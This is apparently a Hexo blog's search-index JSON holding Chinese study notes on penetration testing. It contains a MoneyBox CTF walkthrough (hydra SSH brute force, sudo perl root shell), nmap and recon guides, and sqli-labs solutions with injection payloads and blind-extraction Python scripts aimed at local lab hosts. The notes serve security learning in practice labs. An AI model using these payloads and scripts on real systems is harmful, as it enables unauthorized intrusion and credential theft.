{"meta":{"title":"hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"12-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"12-02","excerpt":""},{"title":"#新建页面","text":"","path":"新建页面/index.html","date":"12-03","excerpt":""}],"posts":[{"title":"MoneyBox","text":"一、导入Debian Custum CTF靶场 下载Orade VM VirtualBox和MoneyBox.ova 打开Orade VM VirtualBox,点击管理–导入虚拟电脑 选择MoneyBox.ova文件夹，点击下一步。 导入成功后，点击设置–网络,将连接方式改为仅主机网络，界面名称改为VirtualBox Host-Only Ethernet Adapter。再点击高级，记录MAC地址。 右键Debian Custim CTF启动–正常启动 二、靶场练习 打开kali,点击编辑–虚拟网络编辑器，将桥接模式的已桥接至改为VirtualBox Host-Only Ethernet Adapter 打开终端，开启网卡 123ifconfig //查看桥接的网卡名ifdown //关闭网卡ifup //开启网卡 在本地网络上执行ARP扫描，会显示与桥接网卡接口的本地ip地址和MAC地址，正常会显示靶场的MAC地址。 arp-scan -l -I ethp nmap扫描端口,查看开启的端口 nmap -p- 192.168.56.103 -sC 发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录 ftp 192.168.56.103 查看目录和文件 ls -al 发现一张照片，使用get方法下载 get trytofind.jpg 退出ftp的anonymous用户使用二进制查看图片代码 12exitstrings trytofind.jpg 发现在图片中夹杂着一些代码，使用steghide工具分离隐藏文件 steghide info trytofind.jpg 发现需要密钥，进行扫目录，寻找密钥 dirsearch -u 192.168.56.103 -x 403,404 发现一个blogs目录，网页访问查看源代码发现提示访问另一个网页S3cr3t-T3xt,访问192.168.56.103&#x2F;S3cr3t-T3xt&#x2F;，在源代码中发现一个Key。 返回kali，输入key，发现一个data.txt。 提取data.txt文件，cat data.txt查看内容 steghide extract -sf trytofind.jpg 发现一个用户名renu,并且密码为弱密码。使用Hydra工具暴力破解密码。 123cd /usr/share/wordlists //一般kali字典存放处ls //查看字典文件名hydra -l renu -P rockyou.txt.gz 192.168.56.103 ssh //使用字段暴力破解 使用ssh登录renu用户 ssh renu@192.168.56.103 查看文件名，发现.bash_history和user1.txt，cat查看两个文件 user1.txt存放着第一个flag。 查看历史记录发现一个lily的用户名，尝试的登录一下 ssh lily@192.168.56.103 成功登录后，查看文件名，发现user2.txt，cat查看发现里面有第二个flag。 尝试进入root用户 123sudo -lsudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27; //perl提权，且不需要密码cd /root 查看文件，发现.root.txt文件，查看发现有第三个flag","path":"2024/01/08/MoneyBox/","date":"01-08","excerpt":"","tags":[]},{"title":"信息收集","text":"一、搜索引擎语法1、Google 指令 用法 示例 “”(引号) 用引号来查询一个确切的单词或短语 查找有关《百年孤独》这本书的网页，语法：”百年孤独” -(减号、连字符) 在单词或网站前使用连字符将其从搜索结果中排除 从搜索结果中排除维基百科页面，语法：- *（星号） 添加星号作为未知单词或事实的占位符 查找以“生活就像一个”开头的引语，语法：生活就像一个* filetype: 使用filetype:[后缀]将结果限制为特定的文件格式，如PDF或DOC。 查找PDF格式的Microsoft Office键盘快捷键相关文件，语法：filetype:pdf Microsoft Office键盘快捷键 OR(或者) 用OR分隔搜索词，同时执行两个搜索查询，这将找到包含多个单词之一的页面。 搜索引用了“Google Drive”、“Dropbox”或“OneDrive”的页面，语法：Google Drive OR Dropbox OR OneDrive “hnuit” inurl:login(或id等) 搜”hnuit” inurl:login的登陆页面 “hnuit” inurl:login “hnuit” inurl:id Index of 可以帮助你寻找网络和FTP目录 2、百度 普通搜索 ​ 普通人是直接搜索关键字 intitle - 搜索范围限定在网页标题 ​ ntitle: 和后面的关键词之间不要有空格。 ​ 例如： intitle:后端开发 inurl 搜索范围限定在 url 链接中 ​ 搜索范围限定在 url 链接中. ​ 例如：前端教程 inurl:video ​ 查询词 “前端教程” 是可以出现在网页的任何位置，而 “video” 则必须出现在网页 url 中。 双引号 “” ​ 精确搜索：双引号 ​ 查询词加上双引号 “”，则表示查询词不能被拆分，在搜索结果中必需完整出现，可以对查询词精确匹配。 ​ 如果不加双引号 “”，经过百度分析后可能会拆分。 ​ 比如搜索 “前端开源项目” - 不含特定查询词 ​ 查询词用减号 - 语法可以帮您在搜索结果中 排除包含特定的关键词 的所有网页。 ​ 例子：全栈工程师 -java ​ 查询词 “全栈工程师” 在搜索结果中，“java” 被排除在搜索结果中。 Filetype 搜索指定文档格式 ​ 查询词用 Filetype 语法可以限定查询词出现在指定的文档中，支持文档格式有 pdf，doc，xls，ppt，rtf。对于找文档资料相当有帮助。 ​ 比如：filetype:pdf JavaScript高级程序设计（第4版） 二、cdn介绍及绕过1、介绍CND是解决传输距离和不同运营商节点造成网络速度性能地下的问题。它设置一组在不同运营商直接对接的高速缓存服务器，把用户经常访问的静态资源存储再次。用户请求时，就直接从里用户近的高速缓存服务器发送给用户。通过站长工具：http:&#x2F;ping.chinaz.com查询CDN，如果ping出的ip地址有多个，且分布位置不同，基本确定它使用了CDN服务。 那如何判断服务器上是否有CND呢？这里介绍三个网站： 站长工具：http://ping.chinaz.com/ 爱站网：https://ping.aizhan.com/ 国外ping探测：https://asm.ca.com/en/ping.php 2、如何绕过 子域名地址查询 http://z.zcjun.com/ nslookup查询 nslookup url 国外ping https://get-site-ip.com/ 内部邮箱 查看域名解析地址 三、泛解析介绍泛解析也叫“泛域名解析”，是指，利用通配符 * （星号）来做子域名以实现所有的子域名均指向同一IP地址。例如您的域名是example.com：做一个*.example.com的次级域名A记录指向111.111.111.111，那么生效后当访问者无论是输入“123.example.com”还是“abc.example.com”抑或者“123.abc.example.com”甚至是任意字符组成的子域名均会指向到111.111.111.111这个IP地址。 四、网络空间测绘工具1、fofahttps://fofa.info/ FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。 FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共ip的打印机，网络摄像头，门禁系统，Web服务 …… FOFA 这类搜索引擎又有另一个名字：网络空间测绘系统。 搜索语法的话，主界面就有，需要时可以查询 fofa特点： ​ 1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析 ​ 2.支持下载功能 2、quakehttps://quake.360.net/quake/#/index 3、鹰图https://hunter.qianxin.com/ 4、钟馗之眼https://www.zoomeye.org/business 5、微步在线https://www.threatbook.cn/ 五、社工库六、爱企查、企查查、支付宝、学信网1、爱企查： https://www.aiqicha.com/ 2、企查查 https://www.qcc.com/ 3、支付宝 4、学信网 七、whoisWHOIS（读作“Who is”，而非缩写）是用来查询互联网中域名的IP以及所有者等信息的传输协议。 在kali执行 whois url WHOIS域名查询 https://who.is/ 八、域名DNS解析工具ping、nslookup、dig1、常见 DNS 记录的类型 类型 目的 A 地址记录，用来指定域名的 IPv4 地址，如果需要将域名指向一个 IP 地址，就需要添加 A 记录。 AAAA 用来指定主机名(或域名)对应的 IPv6 地址记录。 CNAME 如果需要将域名指向另一个域名，再由另一个域名提供 ip 地址，就需要添加 CNAME 记录。 MX 如果需要设置邮箱，让邮箱能够收到邮件，需要添加 MX 记录。 NS 域名服务器记录，如果需要把子域名交给其他 DNS 服务器解析，就需要添加 NS 记录。 SOA SOA 这种记录是所有区域性文件中的强制性记录。它必须是一个文件中的第一个记录。 TXT 可以写任何东西，长度限制为 255。绝大多数的 TXT记录是用来做 SPF 记录(反垃圾邮件)。 2、ping:ping其实不能太全面了解DNS解析的过程，只能局部了解DNS解析出来后的其中一台服务器，并且如果DNS配置了多台服务器，并且针对网络环境配置不同的服务器，那么此时也会造成单一值的影响。 3、nslookup 直接查询 1nslookup domain [dns-server] //domain指域名 如果dns-server不指定，默认使用&#x2F;etc&#x2F;resolv.conf 1nslookup baidu.com 查询其它类型的记录 1nslookup -type=type domain [dns-server] 1nslookup -type=MX baidu.com //邮箱记录 4、dig 直接查询 1dig domain @[dns-server] 查询指定类型 1dig [type] domain [dns-server] 输出信息解释 1dig domain 第一部分显示 dig 命令的版本和输入的参数。 第二部分显示服务返回的一些技术详情，比较重要的是 status。如果 status 的值为 NOERROR 则说明本次查询成功结束。 第三部分中的 “QUESTION SECTION” 显示我们要查询的域名。 第四部分的 “ANSWER SECTION” 是查询到的结果。 第五部分则是本次查询的一些统计信息，比如用了多长时间，查询了哪个 DNS 服务器，在什么时间进行的查询等等。 默认情况下 dig 命令查询 A 记录，上图中显示的 A 即说明查询的记录类型为 A 记录。 十、子域名挖掘机layer.exe 十一、小米范小米范子域名收集工具为一款收集子域名（二级域名、三级域名、四级域名）的工具。 此工具使用java 1.8以上版本运行。 这里我们使用它从大量的ip中筛选出我们需要的ip 1、安装将web_finder_2.9.jar文件拖到java8的bin目录下 cmd打开文件终端 输入 1java -jar web_finder_2.9.jar 2、使用我们可以把从fofa下载下来的ip放到小米范","path":"2024/01/07/XinXiShouJi/","date":"01-07","excerpt":"","tags":[]},{"title":"域名信息","text":"搜索引擎搜索 搜索引擎通常会记录域名信息，可以通过site:domain的语法来查询 CDN CDN验证 可通过多地ping的方式确定目标是否使用了CDN。 域名查找 使用了CDN的域名的父域或者子域不一定使用了CDN，可以通过这种方式去查找对应的IP。","path":"2024/01/06/YuMing/","date":"01-06","excerpt":"","tags":[]},{"title":"Nmap","text":"nmap [&lt;扫描类型&gt;...] [&lt;选项&gt;] &#123;&lt;扫描目标说明&gt;&#125; 一.端口扫描扫描主机的「开放端口」，在nmap后面直接跟主机IP（默认扫描1000个端口） nmap 192.168.56.103 1. 指定端口扫描[指定端口]，使用-p参数，可以一次性扫描单个端口，多个端口，或扫描一个范围的端口。 12345nmap 192.168.56.103 -p 80 //单个端口nmap 192.168.56.103 -p 1-80 //某个范围的端口nmap 192.168.56.103 -p 80，3389，21，22 //多个端口nmap 192.168.56.103 -p 1-65535 //全部端口nmap 192.168.56.103 -p- //等价于-p 1-65535 2. 指定扫描方式 TCP全连接扫描 使用-sT参数进行TCP全连接扫描。 「全连接扫描」使用完整的三次握手建立链接，能够建立链接就判定端口开放，否则判定端口关闭。 nmap 192.168.56.103 -p 80,21,22 -sT (1) 如果端口开放，就会进行完整的三次握手，成功建立链接，扫描结果中，STATE字段显示为 open (2)如果端口关闭，就只能进行一次握手，无法建立链接，扫描结果中，STATE字段显示为 closed。 SYN半链接扫描 使用-sS参数进行SYN半链接扫描 [半链接扫描] 只进行两次握手，对方返回确认帧(ACK&#x3D;1)就判定端口开放，否则判定端口关闭。 nmap 192.168.56.101 -p 21,22,80 -sS (1)如果端口开放，就会进行两次握手，扫描结果中，STATE字段为 open 。 (2)如果端口关闭，就只有一次握手，扫描结果中，STATE字段为 closed。 隐秘扫描 隐秘扫描只适用于Linux系统。 [隐秘扫描]向目标主机的端口发送TCP FIN包 或 Xmas tree包 或 Null包，如果收到RST响应包，就判定端口关闭，否则就判定端口开放或被屏蔽(open&#x2F;filtered) 123nmap 192.168.56.103 -p 80 -sF #Fin扫描nmap 192.168.56.103 -p 80 -sN #Null扫描(所有flags都为0的TCP包)nmap 192.168.56.103 -p 80 -sX #Xmas扫描(flags的FIN、URG、PUSH为1的包) 二、主机探测扫描网段中有哪些主机在线，使用-sP参数，不扫描端口，只扫描存活主机。 本质上是ping扫描，能ping通有回包，就判定主机在线。 nmap -sP 192.168.56.0/24 三、服务识别扫描端口时，默认显示端口对应的服务，但不显示服务版本。 想要识别具体的服务版本，可以使用参数-sV参数。 nmap -p 1-80 192.168.56.103 -sV 扫描结果中，VERSION字段显示服务的详细版本。 四、系统识别想要识别操作版本系统，可以使用-O参数。 nmap 192.168.56.103 -p 1-80 -O 提示： Nmap扫描出的系统版本并完全准确，仅供参考。 当识别不出具体版本时，Nmap会以概率的形式列举出可能的操作系统。 五、扫描结果导出Nmap的扫描结果可以保存到文件中，比如文本格式、XML格式。 (1)将扫描结果导出为文本格式，结果原样保存。 nmap -p 1-80 192.168.56.103 -oN 1234.txt (2)将扫描结果导出为XML格式，结果的保存格式会发生变化。 nmap -p 1-80 192.168.56.103 -oX 1234.xml","path":"2024/01/05/Nmap/","date":"01-05","excerpt":"","tags":[]},{"title":"web渗透","text":"dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404 扫目录命令 msf攻击 12msfconsolesearch drupal 找到NO的，一个个尝试，看哪个可以攻击 1234use xxxshow optionsset xxx ip地址run 在返回权限之后，继续输入 1234shell 进行命令行模式python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 用python创建shellfind / -user root -perm -4000 -print 2&gt;/dev/null 搜索root权限下的文件find / -name cron.php -exec &quot;/bin/sh&quot; \\; 提高权限","path":"2024/01/02/web_sentou/","date":"01-02","excerpt":"","tags":[]},{"title":"sqli_labs","text":"Less-1 字符型闭合，闭合符为&#39;,可直接使用联合查询。 http://192.168.2.48/sqli/Less-3/?id=0&#39; union select 1,2,database()-- - Less-2 数字型闭合，可直接使用联合查询。 http://192.168.2.48/sqli/Less-3/?id=0 union select 1,2,database()-- - Less-3 字符型闭合，闭合符为&#39;)，可直接使用联合查询 http://192.168.2.48/sqli/Less-3/?id=0&#39;) union select 1,2,database()-- - Less-4 字符型闭合，闭合符为&quot;)，可直接使用联合查询 http://192.168.2.48/sqli/Less-4/?id=0&quot;) union select 1,2,database()-- - Less-5 字符型闭合，闭合符为&#39;，使用报错注入 http://192.168.2.48/sqli/Less-5/?id=1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- - Less-6 字符型闭合，闭合符为&quot;，使用报错注入 http://192.168.2.48/sqli/Less-6/?id=1&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- - Less-7 字符型闭合，闭合符为&#39;))，布尔盲注，使用python脚本。 import requests session = requests.session() url = &quot;http://192.168.2.48/sqli/Less-7/?id=1&#39;))&quot; def db(): name = &#39;&#39; for i in range(1,50): begin =32 end =128 tmp = (begin+end)//2 while begin &lt; end : paramsGet = url + &quot;/**/and/**/ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i, tmp) response = session.get(paramsGet) if &#39;You are in.... Use outfile......&#39; in response.text: begin = tmp + 1 tmp = (begin+end)//2 else: end = tmp tmp = (begin+end)//2 if(tmp==32): break name += chr(tmp) print(name) db() 12345678910111213141516171819202122232425262728293031323334- ![image-20231225110235188](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251408975.png)# Less-8- 字符型闭合，闭合符为`&#x27;`，布尔盲注，使用python脚本。- ``` import requests session = requests.session() url = &quot;http://192.168.2.48/sqli/Less-8/?id=1&#x27;&quot; def db(): name = &#x27;&#x27; for i in range(1,50): begin =32 end =128 tmp = (begin+end)//2 while begin &lt; end : paramsGet = url + &quot;/**/and/**/ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i, tmp) response = session.get(paramsGet) if &#x27;You are in...........&#x27; in response.text: begin = tmp + 1 tmp = (begin+end)//2 else: end = tmp tmp = (begin+end)//2 if(tmp==32): break name += chr(tmp) print(name) db() Less-9 字符型闭合，闭合符为&#39;，时间盲注，使用python脚本。 import requests import time session = requests.session() url = &quot;http://192.168.2.48/sqli/Less-9/?id=1&#39;&quot; def db(): name = &quot;&quot; for i in range(1, 100): begin = 32 end = 128 tmp = (begin + end) // 2 threshold = 0.05 while begin &lt; end: start_time = time.time() paramsGet = ( url + &quot;/**/and/**/If(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format( i, tmp ) ) session.get(paramsGet) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt;= threshold: begin = tmp + 1 tmp = (begin + end) // 2 else: end = tmp tmp = (begin + end) // 2 if tmp == 32: break name += chr(tmp) print(name) db() 123456789101112131415161718192021222324252627282930313233343536373839404142434445- ![image-20231225110723912](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251409012.png)# Less-10- 字符型闭合，闭合符为`&quot;`，时间盲注，使用python脚本。- ``` import requests import time session = requests.session() url = &#x27;http://192.168.2.48/sqli/Less-10/?id=1&quot;&#x27; def db(): name = &quot;&quot; for i in range(1, 100): begin = 32 end = 128 tmp = (begin + end) // 2 threshold = 0.05 while begin &lt; end: start_time = time.time() paramsGet = ( url + &quot;/**/and/**/If(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format( # + &quot;/**/and/**/If(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format( i, tmp ) ) session.get(paramsGet) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt;= threshold: begin = tmp + 1 tmp = (begin + end) // 2 else: end = tmp tmp = (begin + end) // 2 if tmp == 32: break name += chr(tmp) print(name) db() Less-11 在登录名后面可直接插入联合查询，字符型闭合，闭合符为&#39; 0&#39; union select 1,database()-- - Less-12 在登录名后面可直接插入联合查询，字符型闭合，闭合符为&quot;) 0&quot;) union select 1,database()-- - Less-13 在登录名后面可直接插入报错注入，字符型闭合，闭合符为&#39;) admin&#39;) and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- - Less-14 在登录名后面可直接插入报错注入，字符型闭合，闭合符为&quot; admin&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- - Less-15 在登录名后面可进行布尔盲注，字符型闭合，闭合符为&#39;，使用python脚本 import requests session = requests.Session() url = &quot;http://192.168.2.48/sqli/Less-15/&quot; def db_2(): name = &#39;&#39; for i in range(1, 80): start = 32 end = 128 # 使用可打印的ASCII范围32到127 while start &lt; end: mid = (start + end) // 2 data = &#123; &quot;uname&quot;: f&quot;admin&#39; and if(ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot; &#125; response = session.post(url, data=data) # print(response.text) # print(len(response.text)) if &#39;flag&#39; in response.text: # 如果内容大于某个长度，假设SQL条件为真 start = mid+1 else: end = mid # 调试输出来理解过程 print(f&quot;测试位置 &#123;i&#125;, 字符ASCII: &#123;mid&#125;, start = &#123;start&#125;, end = &#123;end&#125;&quot;) # 循环结束后需要重新设置mid点 mid = (start + end) // 2 found_char = chr(mid) if mid == 32: # 如果ASCII是32（空格），可能表示结束 break name += found_char print(f&quot;找到的字符: &#123;found_char&#125;, 目前的数据库名称: &#123;name&#125;&quot;) print(f&quot;最终数据库名称: &#123;name&#125;&quot;) db_2() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950- ![image-20231225113012756](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251130768.png)# Less-16- 在登录名后面可进行**布尔盲注**，字符型闭合，闭合符为`&quot;)`，使用python脚本- ``` import requests session = requests.Session() url = &quot;http://192.168.2.78/sqli/Less-16/&quot; def db_2(): name = &#x27;&#x27; for i in range(1, 80): start = 32 end = 128 # 使用可打印的ASCII范围32到127 while start &lt; end: mid = (start + end) // 2 data = &#123; &quot;uname&quot;: f&#x27;admin&quot;) and if(ascii(substr((select group_concat(id,username,password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&#x27;, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot; &#125; response = session.post(url, data=data) # print(response.text) # print(len(response.text)) if &#x27;flag&#x27; in response.text: # 如果内容大于某个长度，假设SQL条件为真 start = mid+1 else: end = mid # 调试输出来理解过程 print(f&quot;测试位置 &#123;i&#125;, 字符ASCII: &#123;mid&#125;, start = &#123;start&#125;, end = &#123;end&#125;&quot;) # 循环结束后需要重新设置mid点 mid = (start + end) // 2 found_char = chr(mid) if mid == 32: # 如果ASCII是32（空格），可能表示结束 break name += found_char print(f&quot;找到的字符: &#123;found_char&#125;, 目前的数据库名称: &#123;name&#125;&quot;) print(f&quot;最终数据库名称: &#123;name&#125;&quot;) db_2() Less-17 可在修改密码后插入报错注入,字符型闭合，闭合符为&#39; 0&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- - Less-18 header注入,用yakit抓包，在User Agent部分插入报错注入 SELECT users.username, users.password FROM users WHERE users.username=&#39;admin&#39; and users.password=&#39;admin&#39; ORDER BY users.id DESC LIMIT 0,1是指倒序查找用户名密码，所以输入0，在后面插入报错注入，字符型闭合，闭合符为&#39; POST /sqli/Less-18/ HTTP/1.1 Host: 192.168.2.48 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Origin: http://192.168.2.48 Content-Type: application/x-www-form-urlencoded User-Agent:0&#39; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#39; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cache-Control: max-age=0 Accept-Language: zh-CN,zh;q=0.9 Referer: http://192.168.2.48/sqli/Less-18/ Content-Length: 30 uname=0&amp;passwd=0&amp;submit=Submit 1234567891011121314151617181920212223- ![image-20231225153740932](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251537761.png)# Less-19- 用yakit抓包，根据页面显示，在referer后面可进行**报错注入**- ![image-20231225153902186](sqli_labs.assets/image-20231225153902186.png)- ``` POST /sqli/Less-19/ HTTP/1.1 Host: 192.168.2.48 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Cache-Control: max-age=0 Referer: 0&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#x27; Accept-Language: zh-CN,zh;q=0.9 Origin: http://192.168.2.48 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 30 uname=0&amp;passwd=0&amp;submit=Submit Less-20 用yakit抓包，根据页面显示，在cookie后面可进行报错注入,cookie是在get方式。字符型闭合，闭合符为&#39; GET /sqli/Less-20/index.php HTTP/1.1 Host: 192.168.2.48 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Cookie: uname=adm&#39; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#39; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://192.168.2.48/sqli/Less-20/ 12345678910111213141516171819- ![image-20231225163020198](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251630973.png)# Less-21- 用yakit抓包，根据页面显示，在cookie后面可进行**报错注入**,并且代码被进行了编码，所以需要将注入的代码进行编码后注入。字符型闭合，闭合符为`&#x27;`- ![image-20231225163212438](sqli_labs.assets/image-20231225163212438.png)- ``` GET /sqli/Less-21/index.php HTTP/1.1 Host: 192.168.2.48 Upgrade-Insecure-Requests: 1 Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Cookie: uname=MCcgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSkgb3IgJw== Referer: http://192.168.2.48/sqli/Less-21/ Less-22 用yakit抓包，根据页面显示，在cookie后面可进行报错注入,并且代码被进行了编码，所以需要将注入的代码进行编码后注入。字符型闭合，闭合符为&quot; GET /sqli/Less-22/index.php HTTP/1.1 Host: 192.168.2.48 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Referer: http://192.168.2.48/sqli/Less-22/index.php Accept-Language: zh-CN,zh;q=0.9 Cookie: uname=MCIgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSkgLS0gLQ== Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273- ![image-20231225164959903](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251650723.png)# Less-23- 注释符被屏蔽了，字符型闭合，所以当输入**正确的闭合符+注释符**时会报错。闭合符为`&#x27;`。因为会报错，所以使用**报错注入**- ![image-20231225171126039](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251711248.png)- `http://192.168.2.48/sqli/Less-23/?id=1&#x27; and (extractvalue(1,concat(0x7e,(select database()),0x7e))) or &#x27;`- ![image-20231225170539926](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251705214.png)# Less-24- 通过二次注入修改密码。先注册一个账号`admin&#x27; -- -`，并且登录- 修改`admin&#x27; -- -`的密码，但是在代码中修改的则是`admin`的密码，以此来修改已用用户名的密码- 如果修改失败，说明闭合不对。这关的闭合符为`&#x27;`- ![image-20231225173037591](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251730559.png)# Less-25- 屏蔽了or和and，无论大小写。因为有报错，所以使用**报错**注入。字符型闭合，闭合符为`&#x27;`- `http://192.168.2.48/sqli/Less-25/?id=-1&#x27; || (extractvalue(1,concat(0x7e,(select database()),0x7e))) -- -`- ![image-20231225191920571](sqli_labs.assets/image-20231225191920571.png)# Less-25a- 屏蔽了or和and，无论大小写。数字型闭合，使用`union select 1,2,3-- -`语句得出有三个字段，可使用**联合查询**。- `http://192.168.2.48/sqli/Less-25a\\?id=-1 union select 1,2,database()-- -`- ![image-20231225192937551](sqli_labs.assets/image-20231225192937551.png)# Less-26- 屏蔽了or,and,注释符，空格。字符型闭合，闭合符为`&#x27;`。用括号，其他符号去绕开空格，使用**报错注入**。- `http://192.168.2.48/sqli/Less-26/?id=1&#x27;||(extractvalue(1,concat(0x7e,(select(database())),0x7e)))||&#x27;1&#x27;=&#x27;1`- ![image-20231225195101771](sqli_labs.assets/image-20231225195101771.png)# Less-26a- 屏蔽了or,and,注释符，空格。字符型闭合，闭合符为`&#x27;`。没有报错回显，所以使用**布尔盲注**- `http://192.168.2.48/sqli/Less-26a/?id=1&#x27;&amp;&amp;ascii(substring(database(),1,1))=115&amp;&amp;&#x27;`- ![image-20231225204139846](https://raw.githubusercontent.com/guangfa29/123/main/img/202312252041001.png)- 使用python脚本- ``` import requests session = requests.Session() url = &quot;http://192.168.2.48/sqli/Less-27/?id=0&quot; def db_2(): name = &#x27;&#x27; for i in range(1, 15): start = 32 end = 127 mid = (start + end) // 2 while start &lt;= end: # 假设正确的成功条件是URL返回一个特定的字符串 payload = url + f&quot;&#x27;||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;||&#x27;&quot; print(payload) # 如果你想看实际发送的payload，可以将这行取消注释 response = session.get(payload) if &#x27;Your Login name&#x27; in response.text: start = mid + 1 mid = (start + end) // 2 else: end = mid - 1 mid = (start + end) // 2 if start &gt; 127 or mid == 32: # 如果start大于ASCII字符的上限，则停止 break name += chr(start) # 最后找到ASCII字符应该是start或end，因为它们会汇合 print(name) db_2() Less-27 屏蔽了空格，注释符。空格=%0a 字符型闭合，闭合符为&#39;，报错注入 http://192.168.2.48/sqli/Less-27/?id=1&#39; and%0a(extractvalue(1,concat(0x7e,(select database()),0x7e))) or &#39;1&#39;=&#39;1 Less-27a select,union这类关键词只过滤完全大写或者完全小写，针对php这种弱类型语言，可以采用部分大写，部分小写绕过。字符型闭合，闭合符为&quot;。通过uNion sElect 1,2,3查询有三个字段，使用联合查询。 http://192.168.2.48/sqli/Less-27a/?id=0&quot;%0auNion%0asElect%0a1,database(),3%0aor&quot;1&quot;=&quot;1 Less-28 屏蔽了union select，空格，注释符。字符型闭合，闭合符为&#39;)。没有错误回显，先使用uniounion %0a selectn %0a select 1,2,3发现有三个字段，使用联合查询。 http://192.168.2.48/sqli/Less-28/?id=0&#39;) %0a uniounion %0a selectn%0aselect %0a1,database(),2%0a and 